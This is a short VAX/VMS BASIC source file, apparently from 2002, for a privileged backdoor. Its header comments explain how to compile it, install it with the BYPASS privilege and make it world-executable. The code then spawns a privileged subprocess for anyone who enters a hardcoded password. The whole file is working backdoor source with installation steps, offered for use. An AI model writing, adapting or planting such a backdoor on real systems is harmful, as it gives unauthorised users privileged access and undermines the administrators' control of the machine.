!
!$Id: backdoor.bas,v 1.1 2002/09/26 18:55:11 raptor Exp $
!
!Simple VAX/VMS LIB$SPAWN() backdoor
!by Raptor <raptor@0xdeadbeef.eu.org>
!
!Thanks to Da Beave <beave@manson.vistech.net>
!
!Compile and link:
! basic backdoor.bas
! link backdoor/notraceback
!
!Install as FULLPRIV:
! set def dka0:[backdoor.directory]
! copy backdoor.exe sys$system:
! set def sys$system:
! install
! INSTALL> create backdoor/priv=(bypass)
! INSTALL> list backdoor/full
! INSTALL> exit
! set file sys$system:backdoor.exe /protection=(w:re)
!
!And, finally, run it:
! run backdoor
! set process/priv=bypass
! sho proc/priv

10 external long function lib$spawn
declare long xspawn
input "Insert password: ", pass$
if pass$="secret" then xspawn=lib$spawn()
else print "Authentication failure."
